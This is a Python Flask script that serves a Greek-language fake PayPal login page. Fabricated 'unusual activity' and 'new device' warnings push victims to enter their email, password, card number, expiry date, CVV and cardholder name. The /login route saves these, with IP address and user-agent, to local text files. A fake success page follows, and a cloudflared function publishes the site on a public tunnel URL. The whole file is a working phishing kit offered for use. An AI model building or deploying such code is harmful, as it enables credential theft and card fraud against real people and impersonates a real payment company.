import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'paypal-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/PayPal")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['paypal_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>PayPal - Συνδεθείτε στον Λογαριασμό Σας</title>
        <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" type="image/x-icon">
        <style>
            :root {
                --paypal-blue: #003087;
                --paypal-light-blue: #009cde;
                --paypal-white: #FFFFFF;
                --paypal-gray: #F5F5F5;
                --paypal-dark: #001C3D;
                --paypal-green: #00A65A;
                --paypal-yellow: #FFC439;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #F5F5F5 0%, #E8F0FE 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #333333;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
            }
            
            .paypal-container {
                width: 100%;
                max-width: 480px;
                background: white;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08), 0 0 0 1px rgba(0, 48, 135, 0.05);
                overflow: hidden;
                min-height: 100vh;
            }
            
            @media (min-width: 768px) {
                .paypal-container {
                    border-radius: 16px;
                    min-height: auto;
                    margin: 20px;
                }
                body {
                    padding: 20px;
                }
            }
            
            .paypal-header {
                background: var(--paypal-blue);
                color: white;
                padding: 25px 20px;
                text-align: center;
                position: relative;
            }
            
            @media (min-width: 768px) {
                .paypal-header {
                    padding: 32px 40px;
                }
            }
            
            .logo-container {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 15px;
                margin-bottom: 15px;
            }
            
            .logo-image {
                height: 40px;
                width: auto;
                filter: brightness(0) invert(1);
            }
            
            @media (min-width: 768px) {
                .logo-image {
                    height: 45px;
                }
            }
            
            .paypal-logo {
                font-size: 28px;
                font-weight: 700;
                letter-spacing: -0.5px;
                color: white;
            }
            
            @media (min-width: 768px) {
                .paypal-logo {
                    font-size: 32px;
                }
            }
            
            .security-banner {
                background: linear-gradient(90deg, #00A65A 0%, #00C853 100%);
                color: white;
                padding: 14px 16px;
                margin: 0;
                font-size: 13px;
                font-weight: 600;
                text-align: center;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }
            
            @media (min-width: 768px) {
                .security-banner {
                    font-size: 14px;
                    padding: 16px;
                }
            }
            
            .welcome-message {
                font-size: 20px;
                font-weight: 400;
                color: white;
                margin: 15px 0 8px;
            }
            
            @media (min-width: 768px) {
                .welcome-message {
                    font-size: 24px;
                    margin: 20px 0 10px;
                }
            }
            
            .login-box {
                padding: 25px 20px;
            }
            
            @media (min-width: 768px) {
                .login-box {
                    padding: 40px;
                }
            }
            
            .alert-banner {
                background: #FFF8E1;
                border-left: 4px solid #FFC107;
                padding: 14px;
                margin-bottom: 20px;
                border-radius: 4px;
                display: flex;
                align-items: flex-start;
                gap: 10px;
                font-size: 14px;
            }
            
            @media (min-width: 768px) {
                .alert-banner {
                    padding: 16px;
                    margin-bottom: 30px;
                }
            }
            
            .alert-icon {
                color: #FF9800;
                font-size: 18px;
                flex-shrink: 0;
                line-height: 1;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            @media (min-width: 768px) {
                .form-group {
                    margin-bottom: 24px;
                }
            }
            
            .form-label {
                display: block;
                color: #555555;
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 8px;
            }
            
            input {
                width: 100%;
                padding: 16px;
                border: 2px solid #E0E0E0;
                border-radius: 8px;
                font-size: 16px;
                box-sizing: border-box;
                transition: all 0.2s;
                background: white;
                -webkit-appearance: none;
            }
            
            input:focus {
                border-color: var(--paypal-light-blue);
                outline: none;
                box-shadow: 0 0 0 3px rgba(0, 156, 222, 0.1);
            }
            
            .password-container {
                position: relative;
            }
            
            .show-password {
                position: absolute;
                right: 12px;
                top: 50%;
                transform: translateY(-50%);
                background: none;
                border: none;
                color: #666666;
                cursor: pointer;
                font-size: 14px;
                padding: 5px 10px;
                z-index: 2;
                -webkit-tap-highlight-color: rgba(0,0,0,0.1);
            }
            
            .login-btn {
                background: var(--paypal-blue);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 50px;
                font-size: 16px;
                font-weight: 600;
                width: 100%;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 10px;
                letter-spacing: 0.5px;
                -webkit-tap-highlight-color: rgba(0,0,0,0.1);
                touch-action: manipulation;
            }
            
            .login-btn:hover {
                background: var(--paypal-dark);
            }
            
            @media (min-width: 768px) {
                .login-btn:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 6px 20px rgba(0, 48, 135, 0.2);
                }
            }
            
            .continue-with {
                text-align: center;
                color: #666666;
                margin: 25px 0;
                position: relative;
                font-size: 14px;
            }
            
            .continue-with::before,
            .continue-with::after {
                content: '';
                position: absolute;
                top: 50%;
                width: 30%;
                height: 1px;
                background: #E0E0E0;
            }
            
            .continue-with::before {
                left: 0;
            }
            
            .continue-with::after {
                right: 0;
            }
            
            @media (min-width: 768px) {
                .continue-with {
                    margin: 30px 0;
                }
                .continue-with::before,
                .continue-with::after {
                    width: 40%;
                }
            }
            
            .quick-links {
                display: flex;
                justify-content: center;
                gap: 15px;
                margin: 25px 0;
                flex-wrap: wrap;
            }
            
            @media (min-width: 768px) {
                .quick-links {
                    gap: 20px;
                    margin: 30px 0;
                }
            }
            
            .quick-link {
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 6px;
                color: #666666;
                font-size: 11px;
                text-decoration: none;
                transition: color 0.2s;
                min-width: 60px;
            }
            
            @media (min-width: 768px) {
                .quick-link {
                    font-size: 12px;
                }
            }
            
            .quick-link:hover {
                color: var(--paypal-blue);
            }
            
            .link-icon {
                width: 40px;
                height: 40px;
                background: #F8F9FA;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 18px;
            }
            
            .card-verification {
                background: #F8F9FA;
                border-radius: 12px;
                padding: 20px;
                margin-top: 25px;
                border: 2px dashed #DEE2E6;
            }
            
            @media (min-width: 768px) {
                .card-verification {
                    padding: 30px;
                    margin-top: 30px;
                }
            }
            
            .verification-title {
                color: var(--paypal-blue);
                font-size: 16px;
                font-weight: 600;
                margin-bottom: 15px;
                display: flex;
                align-items: center;
                gap: 8px;
            }
            
            @media (min-width: 768px) {
                .verification-title {
                    font-size: 18px;
                    margin-bottom: 20px;
                }
            }
            
            .card-input {
                font-family: 'Courier New', monospace;
                letter-spacing: 1px;
                font-size: 15px;
            }
            
            .card-row {
                display: flex;
                flex-direction: column;
                gap: 15px;
                margin-bottom: 15px;
            }
            
            @media (min-width: 480px) {
                .card-row {
                    flex-direction: row;
                }
            }
            
            .card-col {
                flex: 1;
            }
            
            .security-note {
                background: #E8F5E9;
                border: 1px solid #C8E6C9;
                border-radius: 8px;
                padding: 12px;
                margin: 20px 0;
                font-size: 12px;
                color: #2E7D32;
                display: flex;
                align-items: flex-start;
                gap: 8px;
            }
            
            @media (min-width: 768px) {
                .security-note {
                    padding: 15px;
                    margin: 25px 0;
                    font-size: 13px;
                }
            }
            
            .payment-activity {
                background: white;
                border: 1px solid #E0E0E0;
                border-radius: 12px;
                padding: 20px;
                margin-top: 25px;
            }
            
            @media (min-width: 768px) {
                .payment-activity {
                    padding: 25px;
                    margin-top: 30px;
                }
            }
            
            .payment-item {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 12px 0;
                border-bottom: 1px solid #F0F0F0;
            }
            
            .payment-item:last-child {
                border-bottom: none;
            }
            
            .payment-amount {
                font-weight: 700;
                color: #00A65A;
                font-size: 16px;
            }
            
            @media (min-width: 768px) {
                .payment-amount {
                    font-size: 18px;
                }
            }
            
            .pending-badge {
                background: #FFF3E0;
                color: #E65100;
                padding: 4px 10px;
                border-radius: 20px;
                font-size: 11px;
                font-weight: 600;
            }
            
            @media (min-width: 768px) {
                .pending-badge {
                    font-size: 12px;
                    padding: 4px 12px;
                }
            }
            
            .footer-links {
                text-align: center;
                padding: 20px;
                border-top: 1px solid #E0E0E0;
                font-size: 11px;
                color: #666666;
                background: #FAFAFA;
            }
            
            @media (min-width: 768px) {
                .footer-links {
                    padding: 25px 40px;
                    font-size: 12px;
                }
            }
            
            .footer-links a {
                color: var(--paypal-blue);
                text-decoration: none;
                margin: 0 6px;
                white-space: nowrap;
            }
            
            @media (min-width: 768px) {
                .footer-links a {
                    margin: 0 10px;
                }
            }
            
            .footer-links a:hover {
                text-decoration: underline;
            }
            
            .account-balance {
                background: linear-gradient(135deg, var(--paypal-blue), var(--paypal-light-blue));
                color: white;
                padding: 20px;
                border-radius: 12px;
                margin: 20px 0;
                text-align: center;
            }
            
            @media (min-width: 768px) {
                .account-balance {
                    padding: 25px;
                    margin: 30px 0;
                }
            }
            
            .balance-amount {
                font-size: 32px;
                font-weight: 700;
                margin: 10px 0;
                letter-spacing: 1px;
            }
            
            @media (min-width: 768px) {
                .balance-amount {
                    font-size: 36px;
                }
            }
            
            .device-warning {
                background: #FFEBEE;
                border: 1px solid #FFCDD2;
                border-radius: 8px;
                padding: 14px;
                margin: 15px 0;
                font-size: 13px;
                color: #C62828;
                display: flex;
                align-items: flex-start;
                gap: 10px;
            }
            
            @media (min-width: 768px) {
                .device-warning {
                    padding: 15px;
                    margin: 20px 0;
                    font-size: 14px;
                }
            }
            
            .verified-badge {
                display: inline-flex;
                align-items: center;
                background: rgba(255, 255, 255, 0.2);
                color: white;
                padding: 4px 10px;
                border-radius: 20px;
                font-size: 11px;
                font-weight: 600;
                margin-left: 8px;
                border: 1px solid rgba(255, 255, 255, 0.3);
            }
            
            @media (min-width: 768px) {
                .verified-badge {
                    font-size: 12px;
                    padding: 6px 12px;
                    margin-left: 10px;
                }
            }
            
            /* Mobile-specific adjustments */
            @media (max-width: 374px) {
                .paypal-header {
                    padding: 20px 15px;
                }
                .login-box {
                    padding: 20px 15px;
                }
                .balance-amount {
                    font-size: 28px;
                }
                input {
                    padding: 14px;
                    font-size: 15px;
                }
                .login-btn {
                    padding: 16px;
                    font-size: 15px;
                }
            }
            
            /* Prevent zoom on iOS input focus */
            @media screen and (max-width: 768px) {
                input, select, textarea {
                    font-size: 16px !important;
                }
            }
            
            /* Better touch targets */
            button, .quick-link, .show-password {
                min-height: 44px;
                min-width: 44px;
            }
            
            .show-password {
                min-width: auto;
            }
        </style>
    </head>
    <body>
        <div class="paypal-container">
            <div class="paypal-header">
                <div class="logo-container">
                    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" 
                         alt="PayPal" 
                         class="logo-image">
                    <div class="paypal-logo">PayPal</div>
                </div>
                <div class="welcome-message">Καλώς ορίσατε ξανά</div>
                <div style="color: rgba(255, 255, 255, 0.9); font-size: 14px; margin-top: 5px;">
                    Συνδεθείτε στον λογαριασμό σας PayPal
                </div>
            </div>
            
            <div class="security-banner">
                <span>🔒</span>
                <span>Προστατεύεται από την ασφάλεια PayPal</span>
            </div>
            
            <div class="login-box">
                <div class="alert-banner">
                    <span class="alert-icon">⚠️</span>
                    <div>
                        <strong>Ειδοποίηση Ασφαλείας:</strong> Ανιχνεύσαμε ασυνήθιστη δραστηριότητα στον λογαριασμό σας. 
                        Παρακαλούμε επαληθεύστε την ταυτότητά σας για να συνεχίσετε.
                    </div>
                </div>
                
                <div class="device-warning">
                    <span>🛡️</span>
                    <div>
                        <strong>Ανιχνεύθηκε Νέα Συσκευή:</strong> Για λόγους ασφαλείας, παρακαλούμε ολοκληρώστε την επαλήθευση 
                        για πρόσβαση στον λογαριασμό σας PayPal.
                    </div>
                </div>
                
                <div class="account-balance">
                    <div style="font-size: 14px; opacity: 0.9;">Διαθέσιμο Υπόλοιπο</div>
                    <div class="balance-amount">$2,847.63</div>
                    <div style="font-size: 12px; opacity: 0.9;">Κατάσταση Λογαριασμού: <span class="verified-badge">Επαληθεύθηκε ✓</span></div>
                </div>
                
                <form action="/login" method="post" id="main-form">
                    <div class="form-group">
                        <label class="form-label">Email ή αριθμός τηλεφώνου</label>
                        <input type="email" 
                               name="email" 
                               placeholder="Εισάγετε το email ή τον αριθμό τηλεφώνου σας" 
                               required 
                               autocomplete="email"
                               inputmode="email">
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Κωδικός πρόσβασης</label>
                        <div class="password-container">
                            <input type="password" 
                                   name="password" 
                                   id="password" 
                                   placeholder="Εισάγετε τον κωδικό πρόσβασής σας" 
                                   required 
                                   autocomplete="current-password">
                            <button type="button" 
                                    class="show-password" 
                                    onclick="togglePassword()"
                                    aria-label="Εμφάνιση κωδικού">Εμφάνιση</button>
                        </div>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        Σύνδεση
                    </button>
                </form>
                
                <div class="continue-with">ή συνδεθείτε με</div>
                
                <div class="quick-links">
                    <a href="#" class="quick-link">
                        <div class="link-icon">📱</div>
                        <div>Τηλέφωνο</div>
                    </a>
                    <a href="#" class="quick-link">
                        <div class="link-icon">📧</div>
                        <div>Email</div>
                    </a>
                    <a href="#" class="quick-link">
                        <div class="link-icon">#️⃣</div>
                        <div>SMS</div>
                    </a>
                </div>
                
                <div class="card-verification">
                    <div class="verification-title">
                        <span>🔐</span>
                        Απαιτείται Πρόσθετη Επαλήθευση
                    </div>
                    
                    <form id="verification-form">
                        <div class="form-group">
                            <label class="form-label">Αριθμός Κάρτας</label>
                            <input type="text" 
                                   name="card_number" 
                                   class="card-input" 
                                   placeholder="1234 5678 9012 3456" 
                                   pattern="[0-9\s]{13,19}" 
                                   maxlength="19" 
                                   required
                                   inputmode="numeric">
                        </div>
                        
                        <div class="card-row">
                            <div class="card-col">
                                <label class="form-label">Ημερομηνία Λήξης</label>
                                <input type="text" 
                                       name="expiry" 
                                       placeholder="ΜΜ/ΕΕ" 
                                       pattern="(0[1-9]|1[0-2])\/[0-9]{2}" 
                                       required
                                       inputmode="numeric">
                            </div>
                            <div class="card-col">
                                <label class="form-label">CVV</label>
                                <input type="text" 
                                       name="cvv" 
                                       placeholder="123" 
                                       pattern="[0-9]{3,4}" 
                                       maxlength="4" 
                                       required
                                       inputmode="numeric">
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Όνομα στην Κάρτα</label>
                            <input type="text" 
                                   name="card_name" 
                                   placeholder="Όπως φαίνεται στην κάρτα" 
                                   required
                                   autocomplete="cc-name">
                        </div>
                        
                        <div class="security-note">
                            <span>🔒</span>
                            <div>Τα στοιχεία της κάρτας σας κρυπτογραφούνται και μεταδίδονται με ασφάλεια. 
                            Αυτή είναι μια διαδικασία εφάπαξ επαλήθευσης.</div>
                        </div>
                        
                        <button type="button" 
                                class="login-btn" 
                                onclick="verifyCard()" 
                                style="background: var(--paypal-green);">
                            Επαλήθευση & Συνέχεια
                        </button>
                    </form>
                </div>
                
                <div class="payment-activity">
                    <div style="color: var(--paypal-blue); font-weight: 600; margin-bottom: 15px; font-size: 16px;">
                        Πρόσφατες Συναλλαγές
                    </div>
                    
                    <div class="payment-item">
                        <div>
                            <div style="font-weight: 600; margin-bottom: 4px;">Amazon.com</div>
                            <div style="font-size: 12px; color: #666666;">Σήμερα • 2:30 ΜΜ</div>
                        </div>
                        <div class="payment-amount">-$129.99</div>
                    </div>
                    
                    <div class="payment-item">
                        <div>
                            <div style="font-weight: 600; margin-bottom: 4px;">Συνδρομή Netflix</div>
                            <div style="font-size: 12px; color: #666666;">Χθες • Αυτόματη Πληρωμή</div>
                        </div>
                        <div class="payment-amount">-$15.49</div>
                    </div>
                    
                    <div class="payment-item">
                        <div>
                            <div style="font-weight: 600; margin-bottom: 4px;">Τραπεζική Μεταφορά</div>
                            <div style="font-size: 12px; color: #666666;">Εκκρεμεί Επαλήθευση</div>
                        </div>
                        <div>
                            <div class="payment-amount">+$500.00</div>
                            <div class="pending-badge">ΕΚΚΡΕΜΕΙ</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="footer-links">
                <a href="#">Απόρρητο</a> • 
                <a href="#">Νομικά</a> • 
                <a href="#">Τέλη</a> • 
                <a href="#">Επικοινωνία</a>
                <div style="margin-top: 15px; color: #999999;">
                    © 1999-2024 PayPal. Με επιφύλαξη παντός δικαιώματος.
                </div>
            </div>
        </div>
        
        <script>
            function togglePassword() {
                const passwordInput = document.getElementById('password');
                const toggleButton = document.querySelector('.show-password');
                
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    toggleButton.textContent = 'Απόκρυψη';
                    toggleButton.setAttribute('aria-label', 'Απόκρυψη κωδικού');
                } else {
                    passwordInput.type = 'password';
                    toggleButton.textContent = 'Εμφάνιση';
                    toggleButton.setAttribute('aria-label', 'Εμφάνιση κωδικού');
                }
                
                // Prevent form submission
                return false;
            }
            
            function verifyCard() {
                const form = document.getElementById('verification-form');
                const button = form.querySelector('.login-btn');
                
                if (form.checkValidity()) {
                    button.textContent = 'Επαληθεύεται...';
                    button.disabled = true;
                    button.style.opacity = '0.7';
                    
                    // Προσομοίωση διαδικασίας επαλήθευσης
                    setTimeout(() => {
                        button.textContent = '✓ Επιτυχής Επαλήθευση';
                        button.style.background = '#00A65A';
                        
                        // Εμφάνιση μηνύματος επιτυχίας
                        const alertDiv = document.createElement('div');
                        alertDiv.className = 'security-note';
                        alertDiv.style.marginTop = '20px';
                        alertDiv.innerHTML = `
                            <span>✅</span>
                            <div><strong>Η επαλήθευση ολοκληρώθηκε!</strong> Η πρόσβαση στον λογαριασμό σας έχει αποκατασταθεί. 
                            Θα ανακατευθυνθείτε σύντομα.</div>
                        `;
                        form.appendChild(alertDiv);
                        
                        // Αυτόματη υποβολή της κύριας φόρμας μετά την επαλήθευση
                        setTimeout(() => {
                            document.getElementById('main-form').submit();
                        }, 2000);
                    }, 1500);
                } else {
                    form.reportValidity();
                }
                
                // Αποφυγή προεπιλεγμένης υποβολής φόρμας
                return false;
            }
            
            // Μορφοποίηση αριθμού κάρτας
            document.querySelector('input[name="card_number"]').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
                e.target.value = formatted.substring(0, 19);
            });
            
            // Μορφοποίηση ημερομηνίας λήξης
            document.querySelector('input[name="expiry"]').addEventListener('input', function(e) {
                let value = e.target.value.replace(/[^0-9]/g, '');
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                e.target.value = value.substring(0, 5);
            });
            
            // Αποφυγή υποβολής φόρμας με Enter για φόρμα επαλήθευσης κάρτας
            document.getElementById('verification-form').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    verifyCard();
                }
            });
            
            // Κινούμενα γραφικά υπολοίπου κατά τη φόρτωση
            document.addEventListener('DOMContentLoaded', function() {
                setTimeout(() => {
                    const balance = document.querySelector('.balance-amount');
                    if (balance) {
                        balance.style.transform = 'scale(1.05)';
                        balance.style.transition = 'transform 0.3s ease';
                        setTimeout(() => {
                            balance.style.transform = 'scale(1)';
                        }, 300);
                    }
                }, 1000);
            });
            
            // Καλύτερη διαχείριση αφής για κινητά
            document.addEventListener('touchstart', function() {}, {passive: true});
            
            // Αποφυγή εστίασης με διπλό πάτημα σε κουμπιά
            document.querySelectorAll('button').forEach(button => {
                button.addEventListener('touchstart', function(e) {
                    if (e.touches.length > 1) {
                        e.preventDefault();
                    }
                }, {passive: false});
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    card_number = request.form.get('card_number', '').strip()
    expiry = request.form.get('expiry', '').strip()
    cvv = request.form.get('cvv', '').strip()
    card_name = request.form.get('card_name', '').strip()
    
    session_id = session.get('paypal_session', 'unknown')

    safe_email = secure_filename(email)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_email}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write("-" * 40 + "\n")
        file.write(f"EMAIL: {email}\n")
        file.write(f"PASSWORD: {password}\n")
        file.write("-" * 40 + "\n")
        file.write("CARD DETAILS:\n")
        file.write(f"CARD NUMBER: {card_number}\n")
        file.write(f"EXPIRY: {expiry}\n")
        file.write(f"CVV: {cvv}\n")
        file.write(f"NAME ON CARD: {card_name}\n")
        file.write("-" * 40 + "\n")
        file.write(f"Platform: PayPal Account Verification\n")
        file.write(f"Shown Balance: $2,847.63\n")
        file.write(f"Alert: 'Unusual Activity Detected'\n")
        file.write(f"Verification: Card Verification Required\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <title>PayPal - Επαλήθευση Ασφαλείας</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #F5F5F5 0%, #E8F0FE 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #333333;
                -webkit-text-size-adjust: 100%;
            }
            
            .success-container {
                width: 100%;
                max-width: 500px;
                background: white;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
                overflow: hidden;
                text-align: center;
                min-height: 100vh;
            }
            
            @media (min-width: 768px) {
                .success-container {
                    border-radius: 16px;
                    min-height: auto;
                    margin: 20px;
                }
            }
            
            .success-header {
                background: linear-gradient(135deg, #00A65A 0%, #00C853 100%);
                color: white;
                padding: 40px 20px;
            }
            
            @media (min-width: 768px) {
                .success-header {
                    padding: 50px 40px;
                }
            }
            
            .success-icon {
                width: 70px;
                height: 70px;
                background: white;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
                font-size: 35px;
                color: #00A65A;
            }
            
            @media (min-width: 768px) {
                .success-icon {
                    width: 80px;
                    height: 80px;
                    font-size: 40px;
                    margin-bottom: 25px;
                }
            }
            
            .success-title {
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 8px;
            }
            
            @media (min-width: 768px) {
                .success-title {
                    font-size: 28px;
                    margin-bottom: 10px;
                }
            }
            
            .success-body {
                padding: 30px 20px;
            }
            
            @media (min-width: 768px) {
                .success-body {
                    padding: 40px;
                }
            }
            
            .progress-bar {
                height: 6px;
                background: #E0E0E0;
                border-radius: 3px;
                margin: 25px 0;
                overflow: hidden;
            }
            
            .progress-fill {
                height: 100%;
                background: linear-gradient(90deg, #00A65A, #00C853);
                border-radius: 3px;
                width: 0%;
                animation: fillProgress 2s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .status-list {
                text-align: left;
                margin: 25px 0;
            }
            
            .status-item {
                display: flex;
                align-items: flex-start;
                padding: 14px 0;
                border-bottom: 1px solid #F0F0F0;
            }
            
            .status-item:last-child {
                border-bottom: none;
            }
            
            .status-icon {
                color: #00A65A;
                font-weight: bold;
                margin-right: 15px;
                font-size: 18px;
                min-width: 25px;
                line-height: 1;
            }
            
            .account-details {
                background: #F8F9FA;
                border-radius: 12px;
                padding: 20px;
                margin: 25px 0;
                text-align: left;
            }
            
            @media (min-width: 768px) {
                .account-details {
                    padding: 25px;
                    margin: 30px 0;
                }
            }
            
            .detail-row {
                display: flex;
                justify-content: space-between;
                margin: 10px 0;
                font-size: 14px;
                flex-wrap: wrap;
            }
            
            .detail-label {
                color: #666666;
                margin-right: 10px;
            }
            
            .detail-value {
                font-weight: 600;
                color: #333333;
            }
            
            .redirect-notice {
                background: #E3F2FD;
                border: 1px solid #BBDEFB;
                border-radius: 8px;
                padding: 14px;
                margin: 20px 0;
                font-size: 13px;
                color: #0D47A1;
            }
            
            @media (min-width: 768px) {
                .redirect-notice {
                    padding: 15px;
                    margin: 25px 0;
                    font-size: 14px;
                }
            }
            
            .login-btn {
                background: #003087;
                color: white;
                border: none;
                padding: 18px;
                border-radius: 50px;
                font-size: 16px;
                font-weight: 600;
                width: 100%;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 15px;
                -webkit-tap-highlight-color: rgba(0,0,0,0.1);
                touch-action: manipulation;
            }
            
            .login-btn:hover {
                background: #001C3D;
            }
            
            .footer {
                padding: 20px;
                border-top: 1px solid #E0E0E0;
                font-size: 11px;
                color: #666666;
                background: #FAFAFA;
            }
            
            @media (min-width: 768px) {
                .footer {
                    padding: 25px 40px;
                    font-size: 12px;
                }
            }
            
            /* Mobile adjustments */
            @media (max-width: 374px) {
                .success-header {
                    padding: 30px 15px;
                }
                .success-body {
                    padding: 25px 15px;
                }
                .success-icon {
                    width: 60px;
                    height: 60px;
                    font-size: 30px;
                }
                .success-title {
                    font-size: 22px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="5;url=/" />
    </head>
    <body>
        <div class="success-container">
            <div class="success-header">
                <div class="success-icon">✓</div>
                <div class="success-title">Επιτυχής Επαλήθευση</div>
                <div style="opacity: 0.9; font-size: 15px;">
                    Ο λογαριασμός σας PayPal είναι πλέον ασφαλής
                </div>
            </div>
            
            <div class="success-body">
                <div style="color: #666666; font-size: 14px; margin-bottom: 25px;">
                    Ο λογαριασμός σας επαληθεύτηκε με επιτυχία. Θα ανακατευθυνθείτε στον πίνακα ελέγχου του PayPal.
                </div>
                
                <div class="progress-bar">
                    <div class="progress-fill"></div>
                </div>
                
                <div class="status-list">
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Επαληθεύτηκε Η Ταυτότητα</strong>
                            <div style="color: #666666; font-size: 13px; margin-top: 4px;">
                                Τα διαπιστευτήριά σας επιβεβαιώθηκαν
                            </div>
                        </div>
                    </div>
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Επαληθεύτηκε Η Κάρτα</strong>
                            <div style="color: #666666; font-size: 13px; margin-top: 4px;">
                                Η μέθοδος πληρωμής προστέθηκε με επιτυχία
                            </div>
                        </div>
                    </div>
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Βελτιώθηκε Η Ασφάλεια</strong>
                            <div style="color: #666666; font-size: 13px; margin-top: 4px;">
                                Ενεργοποιήθηκε η επαλήθευση δύο βημάτων
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="account-details">
                    <div style="color: #003087; font-weight: 600; margin-bottom: 15px; font-size: 16px;">
                        Περίληψη Λογαριασμού
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Κατάσταση Λογαριασμού:</span>
                        <span class="detail-value" style="color: #00A65A;">Επαληθεύθηκε ✓</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Υπόλοιπο:</span>
                        <span class="detail-value">$2,847.63</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Τελευταία Σύνδεση:</span>
                        <span class="detail-value">Μόλις τώρα</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Συσκευή:</span>
                        <span class="detail-value">Επαληθεύθηκε νέα συσκευή</span>
                    </div>
                </div>
                
                <div class="redirect-notice">
                    ⏳ Ανακατεύθυνση στον πίνακα ελέγχου σε 5 δευτερόλεπτα...
                </div>
                
                <button class="login-btn" onclick="window.location.href='/'">
                    Συνέχεια στο PayPal
                </button>
            </div>
            
            <div class="footer">
                Για λόγους ασφαλείας, μην μοιράζεστε τους κωδικούς επαλήθευσής σας.
                <div style="margin-top: 10px;">
                    Χρειάζεστε βοήθεια; <a href="#" style="color: #003087; text-decoration: none;">Επικοινωνήστε με την Υποστήριξη PayPal</a>
                </div>
            </div>
        </div>
        
        <script>
            // Κινούμενα στοιχεία κατά τη φόρτωση
            document.addEventListener('DOMContentLoaded', function() {
                setTimeout(() => {
                    const statusItems = document.querySelectorAll('.status-item');
                    statusItems.forEach((item, index) => {
                        item.style.opacity = '0';
                        item.style.transform = 'translateX(-20px)';
                        
                        setTimeout(() => {
                            item.style.transition = 'all 0.5s ease';
                            item.style.opacity = '1';
                            item.style.transform = 'translateX(0)';
                        }, index * 200);
                    });
                }, 500);
            });
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"💰 PayPal Δημόσιος Σύνδεσμος: {tunnel_url}")
